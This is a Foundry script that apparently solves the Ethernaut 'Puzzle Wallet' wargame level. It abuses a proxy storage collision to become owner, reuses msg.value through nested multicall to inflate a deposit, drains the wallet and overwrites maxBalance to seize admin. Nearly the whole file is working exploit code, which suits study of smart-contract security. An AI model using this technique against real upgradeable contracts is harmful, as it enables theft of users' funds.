// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PuzzleProxy, PuzzleWallet} from "../src/24_PuzzleWallet.sol";
import {Script, console} from "forge-std/Script.sol";

contract PuzzleWalletSolve is Script {
    PuzzleProxy proxy = PuzzleProxy(payable(0x60A62eF9F057a2Ff4B253fD1cE745e2Cab54167c));
    PuzzleWallet wallet = PuzzleWallet(0x60A62eF9F057a2Ff4B253fD1cE745e2Cab54167c);
    address player = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Wallet Balance Before#", address(wallet).balance);

        proxy.proposeNewAdmin(player);
        wallet.addToWhitelist(player);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory nestedMultiCall = new bytes[](2);
        nestedMultiCall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMultiCall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        wallet.multicall{value: address(wallet).balance}(nestedMultiCall);

        wallet.execute(player, address(wallet).balance, "");
        wallet.setMaxBalance(uint256(uint160(player)));
        console.log("Wallet Balance After#", address(wallet).balance);

        vm.stopBroadcast();
    }
}
